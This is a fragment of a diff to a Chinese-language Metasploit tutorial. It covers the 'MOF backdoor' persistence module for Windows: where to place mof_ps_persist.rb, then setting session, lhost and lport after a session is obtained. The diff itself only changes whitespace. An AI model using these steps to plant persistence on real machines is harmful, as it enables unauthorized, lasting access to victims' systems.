@@ -357,7 +357,6 @@ Winxp：
 ![维持](https://raw.githubusercontent.com/volcanohatred/volcanohatred.github.io/master/img/articles/metasploit/进阶篇/图片62.png)  
 Msf之mof后门（现已无法免杀）
 模块已经给出：
-
 将里面的persistence/mof_ps_persist.rb放置到msf安装路径metasploit-framework\embedded\framework\modules\post\windows里面（windows）
 在得到会话后，将会话放置到后台，然后输入：  
 ```
@@ -366,4 +365,4 @@ set session (获得的会话id)
 set lhosts (本地ip)
 set lport (本地端口)
 ```  
-即可。
+即可。  
